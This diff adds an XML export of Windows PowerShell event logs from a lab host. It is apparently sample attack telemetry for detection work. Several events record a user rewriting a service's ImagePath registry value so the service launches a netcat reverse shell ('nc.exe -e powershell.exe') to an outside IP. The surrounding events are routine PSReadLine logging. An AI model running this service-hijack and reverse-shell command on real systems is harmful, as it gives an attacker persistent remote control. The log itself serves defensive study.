@@ -1,0 +1,382 @@
+<root>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShell" />
+      <EventID Qualifiers="0">800</EventID>
+      <Version>0</Version>
+      <Level>4</Level>
+      <Task>8</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x80000000000000</Keywords>
+      <TimeCreated SystemTime="2021-10-07T18:21:36.860523800Z" />
+      <EventRecordID>1172261</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="0" ThreadID="0" />
+      <Channel>Windows PowerShell</Channel>
+      <Computer>win10-02.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data>
+      </Data>
+      <Data>	DetailSequence=1
+	DetailTotal=1
+
+	SequenceNumber=2346
+
+	UserId=OFFSEC\admmig
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=cd8cafb9-7c03-4e5e-9d54-914780550df1
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=5.1.19041.1237
+	RunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b
+	PipelineId=173
+	ScriptName=
+	CommandLine=</Data>
+      <Data>CommandInvocation(PSConsoleHostReadLine): "PSConsoleHostReadLine"
+</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4103</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>106</Task>
+      <Opcode>20</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-07T18:21:36.864698000Z" />
+      <EventRecordID>1341591</EventRecordID>
+      <Correlation ActivityID="{82305249-b6dd-0000-7215-5b82ddb6d701}" />
+      <Execution ProcessID="1636" ThreadID="9868" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>win10-02.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="ContextInfo">        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.19041.1237
+        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.19041.1237
+        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b
+        Pipeline ID = 173
+        Command Name = PSConsoleHostReadLine
+        Command Type = Function
+        Script Name = 
+        Command Path = 
+        Sequence Number = 2347
+        User = OFFSEC\admmig
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data>
+      <Data Name="UserData">
+      </Data>
+      <Data Name="Payload">CommandInvocation(PSConsoleHostReadLine): "PSConsoleHostReadLine"
+</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>2</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-07T18:21:36.889776200Z" />
+      <EventRecordID>1341592</EventRecordID>
+      <Correlation ActivityID="{82305249-b6dd-0001-ef2c-5882ddb6d701}" />
+      <Execution ProcessID="1636" ThreadID="9868" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>win10-02.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name ImagePath -value "C:\nc.exe -e powershell.exe 10.10.14.26 4447"</Data>
+      <Data Name="ScriptBlockId">e3b09c38-03f2-4932-b5a6-737f7bcca7cc</Data>
+      <Data Name="Path">
+      </Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShell" />
+      <EventID Qualifiers="0">800</EventID>
+      <Version>0</Version>
+      <Level>4</Level>
+      <Task>8</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x80000000000000</Keywords>
+      <TimeCreated SystemTime="2021-10-07T18:21:37.133768000Z" />
+      <EventRecordID>1172262</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="0" ThreadID="0" />
+      <Channel>Windows PowerShell</Channel>
+      <Computer>win10-02.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data>Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name ImagePath -value "C:\nc.exe -e powershell.exe 10.10.14.26 4447"</Data>
+      <Data>	DetailSequence=1
+	DetailTotal=1
+
+	SequenceNumber=2352
+
+	UserId=OFFSEC\admmig
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=cd8cafb9-7c03-4e5e-9d54-914780550df1
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=5.1.19041.1237
+	RunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b
+	PipelineId=174
+	ScriptName=
+	CommandLine=Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name ImagePath -value "C:\nc.exe -e powershell.exe 10.10.14.26 4447"</Data>
+      <Data>CommandInvocation(Set-ItemProperty): "Set-ItemProperty"
+ParameterBinding(Set-ItemProperty): name="Path"; value="HKLM:\System\CurrentControlSet\services\xboxgip"
+ParameterBinding(Set-ItemProperty): name="Name"; value="ImagePath"
+ParameterBinding(Set-ItemProperty): name="Value"; value="C:\nc.exe -e powershell.exe 10.10.14.26 4447"
+</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShell" />
+      <EventID Qualifiers="0">800</EventID>
+      <Version>0</Version>
+      <Level>4</Level>
+      <Task>8</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x80000000000000</Keywords>
+      <TimeCreated SystemTime="2021-10-07T18:21:37.133768000Z" />
+      <EventRecordID>1172263</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="0" ThreadID="0" />
+      <Channel>Windows PowerShell</Channel>
+      <Computer>win10-02.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data>
+      </Data>
+      <Data>	DetailSequence=1
+	DetailTotal=1
+
+	SequenceNumber=2356
+
+	UserId=OFFSEC\admmig
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=cd8cafb9-7c03-4e5e-9d54-914780550df1
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=5.1.19041.1237
+	RunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b
+	PipelineId=174
+	ScriptName=
+	CommandLine=</Data>
+      <Data>CommandInvocation(Out-Default): "Out-Default"
+</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4103</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>106</Task>
+      <Opcode>20</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-07T18:21:37.136101500Z" />
+      <EventRecordID>1341593</EventRecordID>
+      <Correlation ActivityID="{82305249-b6dd-0000-8621-5b82ddb6d701}" />
+      <Execution ProcessID="1636" ThreadID="9868" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>win10-02.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="ContextInfo">        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.19041.1237
+        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.19041.1237
+        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b
+        Pipeline ID = 174
+        Command Name = Set-ItemProperty
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 2353
+        User = OFFSEC\admmig
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data>
+      <Data Name="UserData">
+      </Data>
+      <Data Name="Payload">CommandInvocation(Set-ItemProperty): "Set-ItemProperty"
+ParameterBinding(Set-ItemProperty): name="Path"; value="HKLM:\System\CurrentControlSet\services\xboxgip"
+ParameterBinding(Set-ItemProperty): name="Name"; value="ImagePath"
+ParameterBinding(Set-ItemProperty): name="Value"; value="C:\nc.exe -e powershell.exe 10.10.14.26 4447"
+</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4103</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>106</Task>
+      <Opcode>20</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-07T18:21:37.137877500Z" />
+      <EventRecordID>1341594</EventRecordID>
+      <Correlation ActivityID="{82305249-b6dd-0001-ef2c-5882ddb6d701}" />
+      <Execution ProcessID="1636" ThreadID="9868" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>win10-02.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="ContextInfo">        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.19041.1237
+        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.19041.1237
+        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b
+        Pipeline ID = 174
+        Command Name = 
+        Command Type = Script
+        Script Name = 
+        Command Path = 
+        Sequence Number = 2357
+        User = OFFSEC\admmig
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data>
+      <Data Name="UserData">
+      </Data>
+      <Data Name="Payload">CommandInvocation(Out-Default): "Out-Default"
+</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShell" />
+      <EventID Qualifiers="0">800</EventID>
+      <Version>0</Version>
+      <Level>4</Level>
+      <Task>8</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x80000000000000</Keywords>
+      <TimeCreated SystemTime="2021-10-07T18:21:37.141774500Z" />
+      <EventRecordID>1172264</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="0" ThreadID="0" />
+      <Channel>Windows PowerShell</Channel>
+      <Computer>win10-02.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data>    Microsoft.PowerShell.Core\Set-StrictMode -Off
+</Data>
+      <Data>	DetailSequence=1
+	DetailTotal=1
+
+	SequenceNumber=2371
+
+	UserId=OFFSEC\admmig
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=cd8cafb9-7c03-4e5e-9d54-914780550df1
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=5.1.19041.1237
+	RunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b
+	PipelineId=176
+	ScriptName=C:\Program Files\WindowsPowerShell\Modules\PSReadline\2.0.0\PSReadLine.psm1
+	CommandLine=    Microsoft.PowerShell.Core\Set-StrictMode -Off
+</Data>
+      <Data>CommandInvocation(Set-StrictMode): "Set-StrictMode"
+ParameterBinding(Set-StrictMode): name="Off"; value="True"
+</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>2</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-07T18:21:37.143881800Z" />
+      <EventRecordID>1341595</EventRecordID>
+      <Correlation ActivityID="{82305249-b6dd-0000-8821-5b82ddb6d701}" />
+      <Execution ProcessID="1636" ThreadID="9868" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>win10-02.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">prompt</Data>
+      <Data Name="ScriptBlockId">604661d0-5757-4d50-8024-6d3a16ebe5ce</Data>
+      <Data Name="Path">
+      </Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4103</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>106</Task>
+      <Opcode>20</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-07T18:21:37.146686800Z" />
+      <EventRecordID>1341596</EventRecordID>
+      <Correlation ActivityID="{82305249-b6dd-0000-8d21-5b82ddb6d701}" />
+      <Execution ProcessID="1636" ThreadID="9868" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>win10-02.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="ContextInfo">        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.19041.1237
+        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.19041.1237
+        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b
+        Pipeline ID = 176
+        Command Name = Set-StrictMode
+        Command Type = Cmdlet
+        Script Name = C:\Program Files\WindowsPowerShell\Modules\PSReadline\2.0.0\PSReadLine.psm1
+        Command Path = 
+        Sequence Number = 2372
+        User = OFFSEC\admmig
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data>
+      <Data Name="UserData">
+      </Data>
+      <Data Name="Payload">CommandInvocation(Set-StrictMode): "Set-StrictMode"
+ParameterBinding(Set-StrictMode): name="Off"; value="True"
+</Data>
+    </EventData>
+  </Event>
+</root>
